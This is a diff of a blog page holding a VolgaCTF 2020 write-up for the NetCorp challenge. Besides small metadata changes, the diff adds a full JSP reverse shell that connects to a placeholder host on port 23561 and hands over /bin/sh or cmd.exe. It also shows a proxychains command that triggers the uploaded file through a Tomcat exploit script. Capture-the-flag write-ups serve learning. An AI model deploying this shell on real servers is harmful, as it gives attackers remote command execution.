@@ -392,14 +392,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1k
+                    1.2k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    5 分
+                    6 分
                 </div>
                 
 
@@ -591,7 +591,59 @@ public class ServeScreenshotServlet extends HttpServlet {
 
 </code></pre><p>文件名经过<code>md5</code></p>
 <p>那就上传<code>jsp</code>文件，然后<code>rce</code>了</p>
-<pre><code>proxychains python tomcat.py  read_file --webapp=NetCorp  uploads/d17faea05c8d3f2ff9b5f67f6fa0e7a6 netcorp.q.2020.volgactf.ru</code></pre><p><img src="../../../../../../../images/VolgaCTF2020-Qualifier-writeup/netcorp.png" alt=""></p>
+<pre><code>&lt;%@page import="java.lang.*"%&gt;
+&lt;%@page import="java.util.*"%&gt;
+&lt;%@page import="java.io.*"%&gt;
+&lt;%@page import="java.net.*"%&gt;
+&lt;%
+  class StreamConnector extends Thread
+  {
+    InputStream zd;
+    OutputStream fm;
+    StreamConnector( InputStream zd, OutputStream fm )
+    {
+      this.zd = zd;
+      this.fm = fm;
+    }
+    public void run()
+    {
+      BufferedReader fr  = null;
+      BufferedWriter ctw = null;
+      try
+      {
+        fr  = new BufferedReader( new InputStreamReader( this.zd ) );
+        ctw = new BufferedWriter( new OutputStreamWriter( this.fm ) );
+        char buffer[] = new char[8192];
+        int length;
+        while( ( length = fr.read( buffer, 0, buffer.length ) ) &gt; 0 )
+        {
+          ctw.write( buffer, 0, length );
+          ctw.flush();
+        }
+      } catch( Exception e ){}
+      try
+      {
+        if( fr != null )
+          fr.close();
+        if( ctw != null )
+          ctw.close();
+      } catch( Exception e ){}
+    }
+  }
+  try
+  {
+    String ShellPath;
+if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
+  ShellPath = new String("/bin/sh");
+} else {
+  ShellPath = new String("cmd.exe");
+}
+    Socket socket = new Socket( "ip", 23561 );
+    Process process = Runtime.getRuntime().exec( ShellPath );
+    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
+    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
+  } catch( Exception e ) {}
+%&gt;</code></pre><pre><code>proxychains python tomcat.py  read_file --webapp=NetCorp  uploads/d17faea05c8d3f2ff9b5f67f6fa0e7a6 netcorp.q.2020.volgactf.ru</code></pre><p><img src="../../../../../../../images/VolgaCTF2020-Qualifier-writeup/netcorp.png" alt=""></p>
 <script>
         document.querySelectorAll('.github-emoji')
           .forEach(el => {
@@ -965,7 +1017,7 @@ public class ServeScreenshotServlet extends HttpServlet {
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">5.9k</span>&nbsp;字
+                class="white-color">6k</span>&nbsp;字
             
             
             
